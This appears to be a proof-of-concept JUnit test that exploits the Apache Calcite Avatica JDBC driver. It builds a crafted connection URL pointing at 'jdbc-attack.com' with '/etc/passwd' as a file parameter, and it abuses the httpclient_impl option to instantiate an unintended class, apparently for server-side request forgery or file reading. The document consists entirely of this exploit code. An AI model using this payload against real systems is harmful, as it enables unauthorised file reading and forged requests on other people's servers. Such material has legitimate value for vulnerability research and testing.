package com.tganda.poc;

import org.apache.calcite.avatica.remote.Driver;
import org.junit.jupiter.api.Test;

import java.sql.DriverManager;
import java.sql.SQLException;

public class Poc {
    @Test
    public void ssrf() throws SQLException {
        DriverManager.registerDriver(new Driver());
        String url = "jdbc:avatica:remote:url=https://jdbc-attack.com?file=/etc/passwd;httpclient_impl=sun.security.provider.PolicyFile";

        DriverManager.getConnection(url);
    }
}
